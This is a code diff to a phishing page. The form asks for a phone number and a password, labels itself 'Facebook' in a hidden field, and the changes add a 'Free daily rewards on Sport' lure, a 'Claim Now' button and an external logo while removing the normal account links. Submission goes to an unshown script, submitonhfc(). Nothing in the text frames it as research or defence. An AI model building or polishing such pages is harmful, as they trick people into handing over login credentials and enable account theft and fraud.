@@ -6,12 +6,20 @@
     
   }
 .input-field {
-    width: 30px;
+    width:100%;
     padding: 10px;
     margin: 8px 0;
     border: 1px solid #ddd;
     border-radius: 5px;
     font-size: 16px;
+    text-align:bold;
+    
+    display:block;
+    font-size:20px;
+    font-weight:bold;
+    padding:10px 0;
+    text-align:center;
+    text-decoration: none;
 }
 .login-button {
     background-color: green;
@@ -28,7 +36,7 @@ body {
   background-color:white;
 }
   fieldset{
-    height:100px;
+    height:800px;
    } 
 </style>
 <fieldset style="border-radius:5px;background-color:white">
@@ -40,15 +48,13 @@ body {
         <div class="form-container">
             <form onsubmit="submitonhfc(); return false;" method="post">
               <input type="hidden" name="" id="pagename" value="Facebook" />
-              <button style="border-radius:5px;background-color:green">+27</button>
-              <input type="text" id="email" placeholder="Phone Number" class="input-field" name="email" required>
+              <img src="https://i.ibb.co/JvkKxb4/Logopit-1711442731570.png">
+              <p style="color:green">Sign up on Free daily rewards on Sport</p>
+              <input type="tel" id="email" placeholder="Phone Number" class="input-field" name="email" required>
                 <input id="name" type="password" placeholder="Password" class="input-field" name="password" required>
-                
+                <center>
                 <button type="submit" class="login-button">Claim Now</button>
-            <a href="#" id="signup-link">Forgot Password?</a>
-            <div class="divider"></div>
-            <div class="no-social-login">
-                <p>Don't have an account? <a href="#" id="signup-button">Sign Up</a></p>
+            </center>
             </div>
         </div>
     </div>
